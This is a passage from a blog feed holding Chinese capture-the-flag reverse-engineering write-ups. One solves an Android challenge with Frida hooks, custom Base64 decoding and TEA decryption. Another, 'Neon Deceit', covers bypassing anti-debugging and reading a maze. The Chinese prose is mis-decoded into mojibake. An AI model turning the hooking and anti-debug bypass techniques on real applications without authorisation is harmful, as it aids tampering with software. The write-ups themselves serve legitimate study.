class="string">&#x27;&#x27;</span>.join(standard_table[custom_table.index(char)] <span class="keyword">if</span> char <span class="keyword">in</span> custom_table <span class="keyword">else</span> char <span class="keyword">for</span> char <span class="keyword">in</span> reordered_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. æ·»åŠ Base64å¡«å……ï¼ˆå¦‚æœéœ€è¦ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(translated_str) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">    translated_str += <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(translated_str) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Base64è§£ç </span></span><br><span class="line">encrypted_data = base64.b64decode(translated_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">4</span>):</span><br><span class="line">    dword = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, encrypted_data[i:i+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;dword:08X&#125;</span> ,&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x10E14834 ,0x3D635EFC ,0xA2F3D91A ,0xFBCABA4D ,0x37702685 ,0x20C3B847 ,0x58138160 ,0xAB90BC8E ,</span></span><br></pre></td></tr></table></figure><p>å†å¾€ä¸Šçœ‹å‘ç°æœ‰teaåŠ å¯†ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥ï¼Œé™æ€çš„æ˜¯ä¸€ä¸ªå‡å¯†é’¥</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161656522.png" alt="image-20250716165614494"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161656957.png" alt="image-20250716165629933"></p><p>äºæ˜¯ç”¨fridaè¿›è¡ŒåŠ¨è°ƒï¼Œæ‹¿åˆ°çœŸæ­£çš„å¯†é’¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function hookTest999()<span class="punctuation">&#123;</span></span><br><span class="line">     Java.perform(function()<span class="punctuation">&#123;</span></span><br><span class="line">        var libc_base = Module.getBaseAddress(<span class="string">&quot;libnative-lib.so&quot;</span>) <span class="comment">//libcåŸºåœ°å€</span></span><br><span class="line">        var keys = libc_base.add(<span class="number">0x3A010</span>); <span class="comment">//JNZæ‰€åœ¨åç§»</span></span><br><span class="line">        console.log(<span class="string">&quot;libc_base : &quot;</span><span class="punctuation">,</span>libc_base);</span><br><span class="line">         console.log(<span class="string">&quot;keys_address : &quot;</span><span class="punctuation">,</span> keys);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–å†…å­˜èŒƒå›´å†…çš„æŒ‡ä»¤</span></span><br><span class="line">        var size = <span class="number">0x30</span>;</span><br><span class="line">        try <span class="punctuation">&#123;</span></span><br><span class="line">            var instructionBytes = Memory.readByteArray(keys<span class="punctuation">,</span> size);</span><br><span class="line">            console.log(<span class="string">&quot;instructionBytes:\n&quot;</span><span class="punctuation">,</span> instructionBytes);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// è§£ææŒ‡ä»¤ï¼ˆéœ€è¦Frida &gt;= 12.7ï¼‰</span></span><br><span class="line">            if (typeof Instruction !== &#x27;undefined&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">                var instructions = Instruction.parse(keys<span class="punctuation">,</span> instructionBytes);</span><br><span class="line">                console.log(<span class="string">&quot;Disassembly:&quot;</span><span class="punctuation">,</span> instructions);</span><br><span class="line">            <span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span></span><br><span class="line">                console.warn(<span class="string">&quot;Instruction parser not available&quot;</span>);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span> catch (e) <span class="punctuation">&#123;</span></span><br><span class="line">            console.error(<span class="string">&quot;Memory read failed:&quot;</span><span class="punctuation">,</span> e);</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hook MainActivityçš„checkæ–¹æ³•</span></span><br><span class="line">    var MainActivity = Java.use(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    MainActivity.check.implementation = function(input) <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="comment">// è§¦å‘æŒ‡ä»¤è¯»å–</span></span><br><span class="line">        readInstructions();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è°ƒç”¨åŸå§‹æ–¹æ³•</span></span><br><span class="line">        var result = this.check(input);</span><br><span class="line">        console.log(`Native check(<span class="string">&quot;$&#123;input&#125;&quot;</span>) returned<span class="punctuation">:</span> $<span class="punctuation">&#123;</span>result<span class="punctuation">&#125;</span>`);</span><br><span class="line">        return result;</span><br><span class="line">    <span class="punctuation">&#125;</span>;</span><br><span class="line">    </span><br><span class="line">    console.log(<span class="string">&quot;[*] check() hook installed. Ready for input...&quot;</span>);</span><br><span class="line">    <span class="punctuation">&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161657402.png" alt="image-20250716165758381"></p><p>è¿›è¡Œteaè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* vq,<span class="type">unsigned</span> <span class="type">int</span>* vp,<span class="type">unsigned</span> <span class="type">int</span>* k)</span>&#123;   </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n=<span class="number">32</span>,sum,y=*vq,z=*vp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = <span class="number">0x9E3779B9</span> * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        z-=( ((y&gt;&gt;<span class="number">5</span>)+k[<span class="number">3</span>]) ^ ((y&lt;&lt;<span class="number">4</span>)+k[<span class="number">2</span>]) ^ (sum + y) );</span><br><span class="line">        y-=( ((z&lt;&lt;<span class="number">4</span>)+k[<span class="number">0</span>]) ^ ((z&gt;&gt;<span class="number">5</span>)+k[<span class="number">1</span>]) ^ (sum + z));</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    *vq=y;</span><br><span class="line">    *vp=z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">8</span>] = &#123;<span class="number">0x10E14834</span> ,<span class="number">0x3D635EFC</span> ,<span class="number">0xA2F3D91A</span> ,<span class="number">0xFBCABA4D</span> ,<span class="number">0x37702685</span> ,<span class="number">0x20C3B847</span> ,<span class="number">0x58138160</span> ,<span class="number">0xAB90BC8E</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">0x42</span>, <span class="number">0x37</span>, <span class="number">0x2c</span>, <span class="number">0x21</span>&#125;;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">7</span>;j+=<span class="number">2</span>)</span><br><span class="line"> &#123;</span><br><span class="line">Decrypt(&amp;v[j],&amp;v[j+<span class="number">1</span>], k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>,v[j],v[j+<span class="number">1</span>]);</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#<span class="number">36346065</span> <span class="number">38673534</span></span><br><span class="line">#<span class="number">65353537</span> <span class="number">62303531</span></span><br><span class="line">#<span class="number">61333232</span> <span class="number">34363160</span></span><br><span class="line">#<span class="number">63316239</span> <span class="number">35356761</span></span><br></pre></td></tr></table></figure><p>å†å¾€ä¸Šåˆ†æå‘ç°æœ‰ä¸¤ä¸ªCheckMå’Œcheck1ï¼Œä»–ä»¬ä¸¤ä¸ªçš„ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²æ¯ä¸ªbyteçš„é«˜ä½åˆ†ç¦»å‡ºæ¥ï¼Œç„¶åæŠŠå‰16ä¸ªæ•°å­—å’Œå16ä¸ªæ•°å­—è¿›è¡Œäº¤æ¢ï¼Œç„¶åå†å’ŒåŸæ¥çš„ä½ä½è¿›è¡Œç»„åˆï¼ˆç”¨åŠ¨è°ƒå¯çŸ¥ï¼Œæµ‹è¯•æ•°æ®ï¼šflag{11111111BBBBBBBBSSSSSSSSdddddddd}ï¼‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161703334.png" alt="image-20250716170332294"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">function test666()<span class="punctuation">&#123;</span></span><br><span class="line">Java.perform(function() <span class="punctuation">&#123;</span></span><br><span class="line">    const moduleName = <span class="string">&quot;libnative-lib.so&quot;</span>; <span class="comment">// æ›¿æ¢ä¸ºå®é™… SO æ–‡ä»¶å</span></span><br><span class="line">    const funcOffset = <span class="number">0xff40</span>; <span class="comment">// æ›¿æ¢ä¸º CheckM::check1 è°ƒç”¨åçš„æŒ‡ä»¤åç§»</span></span><br><span class="line"></span><br><span class="line">    let baseAddr = Module.getBaseAddress(moduleName);</span><br><span class="line">    if (!baseAddr || baseAddr.isNull()) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(<span class="string">&quot;Error: Module &quot;</span> + moduleName + <span class="string">&quot; not found or base address is null&quot;</span>);</span><br><span class="line">        return;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    console.log(<span class="string">&quot;Base address: &quot;</span> + baseAddr);</span><br><span class="line"></span><br><span class="line">    let hookAddr = baseAddr.add(funcOffset);</span><br><span class="line">    console.log(<span class="string">&quot;Hook address: &quot;</span> + hookAddr);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(hookAddr<span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">        onEnter<span class="punctuation">:</span> function(args) <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="comment">// ä¸éœ€è¦æ“ä½œ</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        onLeave<span class="punctuation">:</span> function(retval) <span class="punctuation">&#123;</span></span><br><span class="line">            try <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="comment">// è·å– v38 åœ°å€ï¼š[rsp+0x168-0x110] = rsp + 0x58</span></span><br><span class="line">                let v38Addr = this.context.rsp.add(<span class="number">0x58</span>);</span><br><span class="line">                console.log(<span class="string">&quot;RSP: &quot;</span> + this.context.rsp);</span><br><span class="line">                console.log(<span class="string">&quot;v38Addr: &quot;</span> + v38Addr);</span><br><span class="line"></span><br><span class="line">                if (!v38Addr || v38Addr.isNull()) <span class="punctuation">&#123;</span></span><br><span class="line">                    console.log(<span class="string">&quot;Error: v38Addr is invalid or null&quot;</span>);</span><br><span class="line">                    return;</span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// è¯»å– v38 çš„æ ‡å¿—ä½ï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰</span></span><br><span class="line">                let flag = v38Addr.readU8();</span><br><span class="line">                console.log(<span class="string">&quot;Flag: &quot;</span> + flag);</span><br><span class="line">                let isSso = (flag &amp; <span class="number">1</span>) === <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                let dataPtr<span class="punctuation">,</span> dataLen;</span><br><span class="line">                </span><br><span class="line">                if (isSso) <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="comment">// SSO æ¨¡å¼ï¼šæ•°æ®ç´§é‚» v38ï¼Œé•¿åº¦ = flag &gt;&gt; 1</span></span><br><span class="line">                    dataLen = flag &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                    dataPtr = v38Addr.add(<span class="number">1</span>);</span><br><span class="line">                    console.log(<span class="string">&quot;SSO mode - dataLen: &quot;</span> + dataLen + <span class="string">&quot;, dataPtr: &quot;</span> + dataPtr);</span><br><span class="line">                <span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="comment">// å †æ¨¡å¼ï¼šä» v38+8 è¯»é•¿åº¦ï¼Œv38+16 è¯»æŒ‡é’ˆ</span></span><br><span class="line">                    dataLen = Process.arch === &#x27;x64&#x27; ? v38Addr.add(<span class="number">8</span>).readU64() <span class="punctuation">:</span> v38Addr.add(<span class="number">8</span>).readU32();</span><br><span class="line">                    dataPtr = v38Addr.add(<span class="number">16</span>).readPointer();</span><br><span class="line">                    console.log(<span class="string">&quot;Heap mode - dataLen: &quot;</span> + dataLen + <span class="string">&quot;, dataPtr: &quot;</span> + dataPtr);</span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// æ£€æŸ¥ dataPtr å’Œ dataLen æ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">                if (!dataPtr || dataPtr.isNull() || dataLen &lt;= <span class="number">0</span>) <span class="punctuation">&#123;</span></span><br><span class="line">                    console.log(<span class="string">&quot;Error: Invalid dataPtr or dataLen&quot;</span>);</span><br><span class="line">                    return;</span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// è¯»å–å¹¶è¾“å‡ºå†…å®¹</span></span><br><span class="line">                let instructionBytes = Memory.readByteArray(dataPtr<span class="punctuation">,</span> <span class="number">320</span>);</span><br><span class="line">                console.log(<span class="string">&quot;new instructionBytes :\n&quot;</span><span class="punctuation">,</span> instructionBytes);</span><br><span class="line">            <span class="punctuation">&#125;</span> catch (e) <span class="punctuation">&#123;</span></span><br><span class="line">                console.log(<span class="string">&quot;Error in onLeave: &quot;</span> + e);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span>);</span><br><span class="line"><span class="punctuation">&#125;</span>);</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿˜è¦æŠŠåˆšæ‰teaè§£å‡ºçš„ç»“æœæ‹¼æˆä¸€ä¸ªé•¿hexä¸²è¿™ä¸ªæ··æ·†ç„¶åè½¬æ¢æˆå­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tea=<span class="string">&quot;6560343634356738373535653135306232323361603136343962316361673535&quot;</span></span><br><span class="line">tea1=tea[::<span class="number">2</span>] </span><br><span class="line">tea2=tea[<span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">temp=tea1[<span class="number">16</span>:]+tea1[:<span class="number">16</span>] <span class="comment">#é«˜16ä½å’Œä½16ä½æ¢ä½ç½®</span></span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">    flag+=temp[i]+tea2[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br><span class="line"><span class="comment">#b&#x27;504fd5787e5eae02bb3101f4921c175e&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Frida </tag>
            
            <tag> æ”»é˜²ä¸–ç•Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€R3 å¤ç°ã€‘Neon Deceit</title>
      <link href="/2025/07/08/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit/"/>
      <url>/2025/07/08/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit/</url>
      
        <content type="html"><![CDATA[<h1 id="R3-å¤ç°-Neon-Deceit"><a href="#R3-å¤ç°-Neon-Deceit" class="headerlink" title="[R3 å¤ç°]Neon Deceit"></a>[R3 å¤ç°]Neon Deceit</h1><p>åè°ƒè¯•+è¿·å®«+æ— ç”¨æ•°æ®+æ— é™å¾ªç¯+å‡½æ•°åå¼‚å¸¸</p><p>main å‡½æ•°å°±åªæ˜¯ä¸€ä¸ª helloworld ç„¶åé€€å‡ºï¼Œä½†æ˜¯ exit ç”¨æ¥æ··æ·†é€»è¾‘ï¼ŒåŠ¨è°ƒçš„æ—¶å€™éœ€è¦æŠŠ<code>exit</code>ç»™ nop æ‰ï¼ŒçœŸæ­£çš„ä¸»è¦é€»è¾‘åœ¨ä¸‹é¢çš„<code>sub_18597</code> ä¸­ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/9.png" alt="image-20250708213114837"></p><p>è·Ÿè¿›åå‘ç°ä¼ªä»£ç é€»è¾‘ä¸å…¨ï¼Œå‘ç°æ˜¯<code>_verrx</code>æ··æ·†é€»è¾‘å¯¼è‡´è¾“å‡ºä¸å…¨</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/8.png" alt="image-20250708213114837"></p><p>æŠŠ<code>_verrx</code> nop æ‰é‡æ–°åˆ†æå‡½æ•°ï¼Œå‘ç°æœ‰åè°ƒè¯•ã€‚å…ˆå°†ä¸€ä¸ªåŠ å¯†è¿‡çš„å­—ç¬¦ä¸²å’Œ 0x5A è¿›è¡Œå¼‚æˆ–ï¼Œå‘ç°æ˜¯ä¸€äº› linux å¸¸ç”¨è°ƒè¯•å™¨&#x2F;åç¼–è¯‘å™¨çš„åç§°ï¼Œåˆ†æè¿™æ˜¯ä¸€ä¸ªåŸºäºåç§°æŸ¥æ‰¾çš„åè°ƒè¯•ï¼Œä¸‹é¢çš„<code>cimag</code>å‡½æ•°å®é™…æ˜¯é€€å‡ºå‡½æ•°ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/1.png" alt="image-20250708202709091"></p><p>è¿™é‡Œä¹Ÿæ˜¯åè°ƒè¯•çš„ä¸€ç¯æ˜¯ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œè¿™ä¸ªæ— é™å¾ªç¯åœ¨é€»è¾‘ä¸­å‡ºç°å¤šæ¬¡ï¼Œè°ƒè¯•çš„æ—¶å€™è¯·åŠ¡å¿…å¤šåŠ å°å¿ƒ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/3.png" alt="image-20250708203450966"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/2.png" alt="image-20250708203541959"></p><p>å¯åŠ¨è°ƒè¯•ç»•è¿‡åè°ƒè¯•ï¼Œç»è¿‡è¾“å…¥ä¹‹åï¼Œæˆ‘ä»¬ä¼šè¿™é‡Œçš„é€»è¾‘ï¼Œå…¶ä¸­ <code>var_6980</code> å­˜æ”¾ç€è¿·å®«åœ°å›¾ï¼Œ<code>var_6970</code> æ˜¯å­˜æ”¾ç€è¾“å…¥å­—ç¬¦é•¿åº¦çš„åœ°æ–¹ï¼Œ<code>var_6968</code>æ˜¯<code>var_6970/2</code>å¯èƒ½è¦è¿›è¡Œä»€ä¹ˆæ“ä½œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/5.png" alt="image-20250708204908853"></p><p>è¿·å®«åœ°å›¾ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">###################################################</span></span><br><span class="line">                          <span class="params">#</span> <span class="params">#</span>                 <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#####</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#######</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#######</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span>     <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>           <span class="params">#</span> <span class="params">#</span>     <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span>     <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">###</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###########</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###########</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span>   <span class="params">#</span> <span class="params">#</span>     <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>             <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>       <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>     <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">###########</span> <span class="params">#######</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>     <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#########################</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span>                               <span class="params">#</span>             <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#######</span> <span class="params">#############</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">###</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span>             <span class="params">#</span>         <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span>   <span class="params">#</span>     <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#############</span> <span class="params">###########################</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>                                       <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">###</span> <span class="params">###</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span 